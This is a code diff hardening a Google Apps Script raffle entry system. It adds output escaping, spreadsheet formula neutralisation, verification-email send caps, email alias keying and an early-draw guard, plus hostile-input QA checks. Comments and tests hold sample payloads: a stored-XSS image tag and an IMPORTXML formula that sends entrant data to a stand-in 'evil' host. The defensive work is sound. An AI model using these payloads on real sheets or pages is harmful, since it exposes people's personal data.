@@ -77,6 +77,31 @@ var RAFFLE_CODE_TTL_SECONDS = 900;      // 15 minutes to type a 6-digit code
 var RAFFLE_CODE_MAX_ATTEMPTS = 5;
 var RAFFLE_PENDING_PREFIX = 'raffle_pending_';
 
+// ---------- Verification-email abuse caps ----------
+// Step 1 emails a code to whatever address is posted, before anything is
+// verified. That is what verification IS, but it also makes this endpoint a
+// free mailer that anyone with the QR code can drive from a script. Two things
+// have to be bounded:
+//
+//   * one address being mailed over and over (harassment), and
+//   * the account's daily send quota (1,500 on Workspace). The shared
+//     checkRateLimit() caps 15 submissions/MINUTE across both public forms,
+//     which sounds tight but sustains 21,600/day -- the quota dies in under two
+//     hours, taking verification codes, the Open House form's emails and
+//     sendErrorAlert down with it, silently.
+//
+// So: at most 3 codes to one address per hour, and a hard ceiling on total
+// codes per rolling 6-hour window (CacheService's maximum TTL). The party is
+// three hours with about 125 people expected, so the global ceiling is roughly
+// 4x the realistic peak -- it only bites during an attack.
+// Added 2026-09-16 after test/test_redteam.js (T3).
+var RAFFLE_CODE_SEND_PREFIX = 'raffle_codes_';
+var RAFFLE_CODE_MAX_PER_ADDRESS = 3;
+var RAFFLE_CODE_ADDRESS_WINDOW_SECONDS = 3600;   // 1 hour
+var RAFFLE_CODE_GLOBAL_PREFIX = 'raffle_codes_all_';
+var RAFFLE_CODE_MAX_GLOBAL = 500;
+var RAFFLE_CODE_GLOBAL_WINDOW_SECONDS = 21600;   // 6 hours (cache maximum)
+
 // Junk rejection, applied to BOTH steps. This is not politeness -- FUB already
 // carries "test@me.com / 1234567899" and "asdf@asdf.caf" from earlier form
 // testing, and a raffle at a party is exactly where that gets typed on purpose.
@@ -173,11 +198,93 @@ function raffleFmt_(d) {
   return Utilities.formatDate(d, RAFFLE_TZ, 'yyyy-MM-dd HH:mm:ss');
 }
 
+// ---------- Output encoding ----------
+// The host project deliberately stopped HTML-escaping submissions at INGEST
+// (Code.gs, audit fix M1: it was turning O'Brien into O&#39;Brien on the way
+// into FUB) and its comment says the right place to escape is wherever a value
+// is actually rendered as HTML. This module is the first caller that does:
+// raffleStatusPage_ and raffleDrawPage_ build HTML by concatenation from an
+// entrant's name, phone and email, all three of which came from a public text
+// box on a page anyone who scans the QR code can reach.
+//
+// Unescaped, "<img src=x onerror=...> Smith" is a stored XSS that fires in
+// Durand's browser the moment he opens the admin page to read the winner --
+// i.e. at 6:15 in front of the crowd. Found by test/test_redteam.js (T1),
+// 2026-09-16, before it ever ran live.
+//
+// Escape at the sink. Never re-add escaping at ingest: FUB, the Sheet and the
+// plain-text emails all want the real characters.
+function raffleEsc_(v) {
+  return String(v === null || v === undefined ? '' : v)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
+
+// ---------- Spreadsheet write safety ----------
+// Sheets evaluates any cell whose text begins with = + - or @ as a FORMULA, so
+// an entrant who types =IMPORTXML("https://evil/?d="&C2,"//a") into the name box
+// gets that formula executed with Durand's session the moment he opens the
+// entries sheet -- and IMPORTXML/IMPORTDATA/HYPERLINK can quietly ship every
+// other entrant's name, email and phone to a third-party URL. The junk-phone
+// filter does not catch it: that reads digits, and a formula string can carry
+// ten perfectly valid ones.
+//
+// A leading apostrophe is Sheets' own "this is text" marker: it is not part of
+// the value, it is not displayed, and getValue() returns the string without it,
+// so dedupe keys and the FUB push are unaffected. Applied to every cell written
+// from entrant input. Found by test/test_redteam.js (T2), 2026-09-16.
+function raffleSafeCell_(v) {
+  var s = String(v === null || v === undefined ? '' : v);
+  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
+}
+
 // Normalized identity keys. One entry per person is enforced on BOTH, because
 // the same person entering twice will usually vary one and not the other
 // (a nickname in the name field, gmail vs work email, phone typed two ways).
+// One entry per PERSON, and a person has one inbox even when they have many
+// spellings of it. gmail ignores dots entirely and every provider below ignores
+// a +tag suffix, so sam.vance@gmail.com, samvance@gmail.com and
+// sam.vance+party@gmail.com are one mailbox and must be one entry -- otherwise
+// the cheapest possible stuffing attack needs no second inbox and no second
+// phone. Dots are collapsed ONLY for Google-hosted consumer mail, because other
+// hosts do treat a dot as a distinct address.
+//
+// This is a KEY function only. The address actually mailed is always the one
+// the entrant typed.
+//
+// RESIDUAL GAP, accepted knowingly: Google Workspace and other custom domains
+// also honour +tags, and they cannot be enumerated here. The domain list is
+// deliberately conservative -- collapsing +tags everywhere would merge two
+// genuinely distinct people on the rare host that treats + as a literal
+// character, and would also break this project's own QA addresses
+// (durand+raffleqa...@thestawaszgroup.com), which depend on staying distinct.
+//
+// What actually bounds stuffing is not this function: every entry has to
+// RECEIVE a 6-digit code, so each extra entry costs a working inbox, and
+// raffleCheckCodeSendQuota_ caps how many codes any one address can pull. This
+// just removes the free case where one inbox yields unlimited spellings.
+var RAFFLE_PLUS_ALIAS_DOMAINS = ['gmail.com', 'googlemail.com', 'outlook.com',
+  'hotmail.com', 'live.com', 'yahoo.com', 'icloud.com', 'me.com', 'proton.me',
+  'protonmail.com', 'fastmail.com'];
+var RAFFLE_DOT_ALIAS_DOMAINS = ['gmail.com', 'googlemail.com'];
+
 function raffleEmailKey_(email) {
-  return String(email || '').trim().toLowerCase();
+  var v = String(email || '').trim().toLowerCase();
+  var at = v.lastIndexOf('@');
+  if (at < 1) return v;
+  var local = v.slice(0, at), domain = v.slice(at + 1);
+  if (domain === 'googlemail.com') domain = 'gmail.com';
+  if (RAFFLE_PLUS_ALIAS_DOMAINS.indexOf(domain) !== -1) {
+    var plus = local.indexOf('+');
+    if (plus > 0) local = local.slice(0, plus);
+  }
+  if (RAFFLE_DOT_ALIAS_DOMAINS.indexOf(domain) !== -1) {
+    local = local.replace(/\./g, '');
+  }
+  return local + '@' + domain;
 }
 
 function rafflePhoneKey_(phone) {
@@ -308,6 +415,11 @@ function raffleAdminLinks() {
     '',
     'MANUAL DRAW — backup if the 6:15 trigger misfires (private):',
     '  ' + base + '?form=raffle&action=draw&key=' + key,
+    '',
+    '  Before 6:15 this link refuses and tells you so. The draw cannot be undone,',
+    '  so drawing early has to be asked for twice — add &force=1 only if you really',
+    '  mean to close entries now:',
+    '  ' + base + '?form=raffle&action=draw&key=' + key + '&force=1',
     ''
   ];
 
@@ -365,7 +477,7 @@ function raffleServeForm_(e, baseUrl) {
     // token, so a rehearsal draw can be fired straight from a bookmark.
     var adminTest = String(e.parameter.test || '') === '1';
     if (action === 'status') return raffleStatusPage_(adminTest);
-    return raffleDrawPage_(adminTest);
+    return raffleDrawPage_(adminTest, String(e.parameter.force || '') === '1');
   }
 
   var tmpl = HtmlService.createTemplateFromFile('RaffleForm');
@@ -414,8 +526,8 @@ function raffleStatusPage_(test) {
     '<div style="color:#666;margin-bottom:20px">eligible ' + (test ? 'TEST ' : '') + 'entries</div>';
   if (winner) {
     html += '<div style="background:#15464A;color:#fff;padding:16px;border-radius:8px">' +
-      '<div style="opacity:.8;font-size:12px;letter-spacing:1px">WINNER DRAWN ' + winner.drawnAt + '</div>' +
-      '<div style="font-size:22px;font-weight:700;margin-top:4px">' + winner.winner.name + '</div></div>';
+      '<div style="opacity:.8;font-size:12px;letter-spacing:1px">WINNER DRAWN ' + raffleEsc_(winner.drawnAt) + '</div>' +
+      '<div style="font-size:22px;font-weight:700;margin-top:4px">' + raffleEsc_(winner.winner.name) + '</div></div>';
   } else {
     html += '<p style="color:#666">No winner drawn yet. Draw is armed for ' +
       raffleFmt_(new Date(RAFFLE_DRAW_AT)) + ' ET.</p>';
@@ -424,30 +536,30 @@ function raffleStatusPage_(test) {
   return HtmlService.createHtmlOutput(html);
 }
 
-function raffleDrawPage_(test) {
-  var res = raffleDrawWinner_(test);
+function raffleDrawPage_(test, force) {
+  var res = raffleDrawWinner_(test, force);
   if (!res.ok) {
     return HtmlService.createHtmlOutput(
       '<div style="font-family:system-ui,sans-serif;padding:24px"><h2>Draw not completed</h2><p>' +
-      res.error + '</p></div>');
+      raffleEsc_(res.error) + '</p></div>');
   }
   var w = res.result.winner;
   var html = '<div style="font-family:system-ui,sans-serif;padding:24px;max-width:520px">' +
     (test ? '<div style="background:#b3271e;color:#fff;font-weight:700;padding:10px 12px;' +
             'border-radius:6px;margin-bottom:14px">TEST DRAW — the real 6:15 draw is untouched</div>' : '') +
     (res.alreadyDrawn ? '<p style="background:#fff3cd;padding:10px;border-radius:6px">' +
-      'A winner was already drawn at ' + res.result.drawnAt + '. Showing that result — ' +
+      'A winner was already drawn at ' + raffleEsc_(res.result.drawnAt) + '. Showing that result — ' +
       'the draw is deliberately not repeatable.</p>' : '') +
     '<div style="background:#15464A;color:#fff;padding:24px;border-radius:8px;text-align:center">' +
     '<div style="opacity:.8;font-size:12px;letter-spacing:2px">WINNER</div>' +
-    '<div style="font-size:30px;font-weight:700;margin:8px 0">' + w.name + '</div>' +
-    '<div style="opacity:.9">' + w.phone + '<br>' + w.email + '</div></div>' +
+    '<div style="font-size:30px;font-weight:700;margin:8px 0">' + raffleEsc_(w.name) + '</div>' +
+    '<div style="opacity:.9">' + raffleEsc_(w.phone) + '<br>' + raffleEsc_(w.email) + '</div></div>' +
     '<p style="color:#666">Drawn from ' + res.result.totalEligible + ' eligible entries at ' +
-    res.result.drawnAt + ' ET.</p>';
+    raffleEsc_(res.result.drawnAt) + ' ET.</p>';
   if (res.result.backups.length) {
     html += '<p style="color:#666"><b>Backups</b> (if the winner has left):<br>' +
       res.result.backups.map(function (b, i) {
-        return (i + 1) + '. ' + b.name + ' — ' + b.phone;
+        return (i + 1) + '. ' + raffleEsc_(b.name) + ' — ' + raffleEsc_(b.phone);
       }).join('<br>') + '</p>';
   }
   html += '</div>';
@@ -503,7 +615,10 @@ function raffleRequestCode_(d, test) {
   if (name.indexOf(' ') === -1) throw makeValidationError('Enter your first and last name.');
   var email  = raffleRejectJunkEmail_(d.email);
   var digits = raffleRejectJunkPhone_(d.phone);
-  var phone  = String(d.phone || '').trim();
+  // collapseSpaces, not trim: trim only strips the ENDS, so a CR/LF pasted
+  // mid-value survived into the sheet cell and the FUB record. The name field
+  // has always used collapseSpaces; the phone field should never have differed.
+  var phone  = collapseSpaces(d.phone);
   if (d.consent !== 'Yes') throw makeValidationError('You must accept the Official Rules to enter.');
 
   // Tell them they are already in BEFORE making them wait for a code.
@@ -516,6 +631,10 @@ function raffleRequestCode_(d, test) {
         message: 'You are already entered! Winner announced at ' + RAFFLE_ANNOUNCE_AT + '.' });
     }
   }
+
+  // Checked here, AFTER the already-entered short-circuit above: a returning
+  // entrant is told they are already in without consuming any send quota.
+  raffleCheckCodeSendQuota_(emailKey);
 
   var code = String(Math.floor(100000 + Math.random() * 900000));
   var vid  = Utilities.getUuid();
@@ -543,6 +662,54 @@ function raffleRequestCode_(d, test) {
   Logger.log('Raffle: verification code emailed (vid ' + vid + ', test=' + !!test + ').');
   return jsonOut({ ok: true, needsCode: true, vid: vid,
     message: 'We emailed a 6-digit code to ' + email + '.' });
+}
+
+// Throws a validation error -- i.e. a message the entrant sees -- rather than
+// failing silently, so a real person who genuinely did not get the first code
+// is told what to do (find someone from TSG) instead of tapping a dead button.
+//
+// Both counters are incremented under the script lock: the read-modify-write on
+// a shared cache key is otherwise not atomic, and a concurrent burst is exactly
+// the case the cap exists for. Failing to get the lock counts as over-cap
+// (fail closed), matching checkRateLimit()'s behaviour in Code.gs.
+function raffleCheckCodeSendQuota_(emailKey) {
+  var cache = CacheService.getScriptCache();
+  var lock = LockService.getScriptLock();
+  var haveLock = false;
+  try { haveLock = lock.tryLock(1000); } catch (lockErr) { haveLock = false; }
+  if (!haveLock) {
+    throw makeValidationError('We are sending a lot of codes right now — wait a moment and tap Enter again.');
+  }
+  try {
+    var addrKey = RAFFLE_CODE_SEND_PREFIX + emailKey;
+    var addrCount = Number(cache.get(addrKey) || 0);
+    if (addrCount >= RAFFLE_CODE_MAX_PER_ADDRESS) {
+      Logger.log('Raffle: code-send cap hit for one address (' + addrCount + ' in the last hour).');
+      throw makeValidationError('We have already emailed several codes to that address. ' +
+        'Check your inbox and spam folder, or grab someone from TSG and we will enter you.');
+    }
+    var globalKey = RAFFLE_CODE_GLOBAL_PREFIX +
+      Math.floor(Date.now() / (RAFFLE_CODE_GLOBAL_WINDOW_SECONDS * 1000));
+    var globalCount = Number(cache.get(globalKey) || 0);
+    if (globalCount >= RAFFLE_CODE_MAX_GLOBAL) {
+      Logger.log('Raffle: GLOBAL code-send ceiling hit (' + globalCount + '). Possible abuse.');
+      try {
+        sendErrorAlert('Raffle: verification-email ceiling hit',
+          'The rolling ' + (RAFFLE_CODE_GLOBAL_WINDOW_SECONDS / 3600) + '-hour ceiling of ' +
+          RAFFLE_CODE_MAX_GLOBAL + ' verification emails has been reached, so further codes ' +
+          'are being refused to protect the daily send quota (which the Open House form and ' +
+          'these alerts also rely on).\n\nIf this is a real crowd and not abuse, raise ' +
+          'RAFFLE_CODE_MAX_GLOBAL in RaffleCode.gs and redeploy. If it is abuse, entries can ' +
+          'be taken on paper and typed in afterwards.');
+      } catch (alertErr) { /* the alert must never swallow the response */ }
+      throw makeValidationError('We cannot send codes right now. Grab someone from TSG and ' +
+        'we will get you entered.');
+    }
+    cache.put(addrKey, String(addrCount + 1), RAFFLE_CODE_ADDRESS_WINDOW_SECONDS);
+    cache.put(globalKey, String(globalCount + 1), RAFFLE_CODE_GLOBAL_WINDOW_SECONDS);
+  } finally {
+    try { lock.releaseLock(); } catch (releaseErr) { /* non-fatal */ }
+  }
 }
 
 // ---------- Step 2: confirm the code, then actually enter them ----------
@@ -612,8 +779,12 @@ function raffleVerifyCode_(d, test) {
 
 function raffleAppendEntry_(name, email, phone, test) {
   var sh = raffleSheet_(test);
+  // Every value below that came from the entrant goes through raffleSafeCell_,
+  // which prefixes Sheets' text marker to anything starting = + - @ so a typed
+  // formula is stored as text instead of executing when the sheet is opened.
   sh.appendRow([
-    raffleFmt_(raffleNow_()), name, email, phone,
+    raffleFmt_(raffleNow_()),
+    raffleSafeCell_(name), raffleSafeCell_(email), raffleSafeCell_(phone),
     'Yes', RAFFLE_CONSENT_VERSION,
     test ? (QA_TEST_PREFIX + RAFFLE_EVENT_NAME) : RAFFLE_EVENT_NAME,
     'pending', '', 'Yes', 'Yes (code confirmed)'
@@ -637,17 +808,22 @@ function raffleReadEntries_(test) {
   var values = sh.getRange(2, 1, last - 1, RAFFLE_SHEET_HEADERS.length).getValues();
   var out = [];
   values.forEach(function (r, idx) {
-    var name = String(r[1] || '').trim();
+    // Sheets normally consumes the leading apostrophe raffleSafeCell_ writes, so
+    // this is belt-and-braces: strip it on read too, and the value is identical
+    // either way. Without it a neutralized cell would key differently from the
+    // same address typed again.
+    var unmark = function (v) { return String(v || '').replace(/^'/, '').trim(); };
+    var name = unmark(r[1]);
     if (!name) return;
     if (String(r[9] || 'Yes').toLowerCase() === 'no') return; // manually disqualified
     out.push({
       row: idx + 2,
       timestamp: r[0],
       name: name,
-      email: String(r[2] || '').trim(),
-      phone: String(r[3] || '').trim(),
-      emailKey: raffleEmailKey_(r[2]),
-      phoneKey: rafflePhoneKey_(r[3]),
+      email: unmark(r[2]),
+      phone: unmark(r[3]),
+      emailKey: raffleEmailKey_(unmark(r[2])),
+      phoneKey: rafflePhoneKey_(unmark(r[3])),
       fubStatus: String(r[7] || '')
     });
   });
@@ -965,10 +1141,26 @@ function raffleStoredWinner_(test) {
 // Deliberately NOT repeatable. Once a winner is recorded it is returned as-is
 // on every subsequent call, so a double-fired trigger, a refreshed admin page
 // or a second tap can never re-roll a drawing that has already happened.
-function raffleDrawWinner_(test) {
+// `force` exists because the draw is deliberately once-only: whoever it lands
+// on is the winner, and the only way back is raffleResetDrawDANGER() from the
+// editor. That makes an accidental early tap on the admin bookmark -- at 4pm,
+// with an hour of entries still to come and one name in the sheet -- expensive
+// and embarrassing in a way nothing else here is. So a LIVE draw before the
+// close time now has to be asked for twice (&force=1 on the admin URL).
+//
+// The 6:15 trigger passes force itself, so the real draw is never blocked by a
+// few seconds' clock skew, and test mode is exempt entirely: rehearsing the
+// draw at any hour is the whole point of the test tab.
+function raffleDrawWinner_(test, force) {
   var props = PropertiesService.getScriptProperties();
   var existing = raffleStoredWinner_(test);
   if (existing) return { ok: true, alreadyDrawn: true, result: existing };
+
+  if (!test && !force && Date.now() < new Date(RAFFLE_CLOSE_AT).getTime()) {
+    return { ok: false, error: 'Entries are still open until ' +
+      raffleFmt_(new Date(RAFFLE_CLOSE_AT)) + ' ET, and the draw cannot be undone ' +
+      'once it runs. If you really mean to draw now, add &force=1 to this URL.' };
+  }
 
   var lock = LockService.getScriptLock();
   if (!lock.tryLock(20000)) return { ok: false, error: 'Could not acquire the draw lock; try again.' };
@@ -1014,7 +1206,7 @@ function raffleDrawWinner_(test) {
 // The 6:15 trigger target. Thin on purpose: all the logic (and the
 // already-drawn guard) lives in raffleDrawWinner_.
 function raffleScheduledDraw() {
-  var res = raffleDrawWinner_(false);   // the 6:15 trigger is always the LIVE draw
+  var res = raffleDrawWinner_(false, true);   // the 6:15 trigger is always the LIVE draw
   if (!res.ok) {
     Logger.log('Scheduled draw did not complete: ' + res.error);
     try {
@@ -1296,6 +1488,56 @@ function raffleQaRun_(cleanUp) {
     check('a second draw is NOT a re-roll', again.alreadyDrawn === true);
     check('the same winner comes back', again.result.winner.name === draw.result.winner.name);
   }
+
+  // ---- 5b. Hostile input (the parts only the real runtime can prove) ------
+  // The sandbox suite (raffle/test/test_redteam.js) covers this class properly.
+  // Two of its assumptions can only be checked against the real Google runtime,
+  // so they are re-checked here: that Sheets really does treat the apostrophe
+  // raffleSafeCell_ writes as a text marker rather than data, and that the
+  // admin page really does render a hostile name inert.
+  section('5b. Hostile input');
+  var xssName = '<img src=x onerror=alert(1)> QA Tester ' + stamp;
+  var xssRes = enterFully({ fullName: xssName,
+    email: RAFFLE_QA_ADDRESS_BASE + stamp + '-xss' + RAFFLE_QA_DOMAIN,
+    phone: '(215) 555-8105', consent: 'Yes' });
+  check('an entry with markup in the name is accepted (it is only text)', xssRes.ok === true,
+        JSON.stringify(xssRes));
+  var sOut = raffleStatusPage_(true);
+  var sHtml = String(typeof sOut.getContent === 'function' ? sOut.getContent() : sOut);
+  check('the admin page does not emit the raw markup',
+        sHtml.indexOf('<img src=x onerror=alert(1)>') === -1,
+        'STORED XSS — the admin page rendered entrant markup unescaped');
+
+  var formulaName = '=IMPORTXML("https://example.invalid/?d="&C2,"//a") QA ' + stamp;
+  var fRes = enterFully({ fullName: formulaName,
+    email: RAFFLE_QA_ADDRESS_BASE + stamp + '-csv' + RAFFLE_QA_DOMAIN,
+    phone: '(215) 555-8106', consent: 'Yes' });
+  check('an entry with a formula in the name is accepted (it is only text)', fRes.ok === true,
+        JSON.stringify(fRes));
+  var fSheet = raffleSheet_(true);
+  var fRow = fSheet.getLastRow();
+  var nameCell = fSheet.getRange(fRow, 2);
+  check('the formula cell holds NO formula',
+        String(nameCell.getFormula() || '') === '',
+        'LIVE FORMULA IN THE SHEET: ' + nameCell.getFormula());
+  check('the formula cell still reads back as the text that was typed',
+        String(nameCell.getValue()).indexOf('IMPORTXML') !== -1,
+        'got ' + nameCell.getValue());
+  check('raffleReadEntries_ sees the same name with no text marker',
+        raffleReadEntries_(true).some(function (r) { return r.name.charAt(0) !== "'"; }));
+
+  // The verification-email cap. The two entries above already consumed codes for
+  // their own addresses; this hammers ONE address and expects it to be cut off.
+  var capAddr = RAFFLE_QA_ADDRESS_BASE + stamp + '-cap' + RAFFLE_QA_DOMAIN;
+  var capSent = 0, capRefused = 0;
+  for (var ci = 0; ci < RAFFLE_CODE_MAX_PER_ADDRESS + 2; ci++) {
+    var capRes = request({ fullName: 'QA Cap Tester ' + stamp, email: capAddr,
+                           phone: '(215) 555-82' + (10 + ci), consent: 'Yes' });
+    if (capRes.ok && capRes.needsCode) capSent++; else capRefused++;
+  }
+  check('one address cannot pull more than ' + RAFFLE_CODE_MAX_PER_ADDRESS + ' codes',
+        capSent <= RAFFLE_CODE_MAX_PER_ADDRESS, 'sent ' + capSent);
+  check('the over-cap requests were refused', capRefused > 0);
 
   // ---- 6. The live raffle must be untouched -------------------------------
   section('6. The LIVE raffle is untouched');
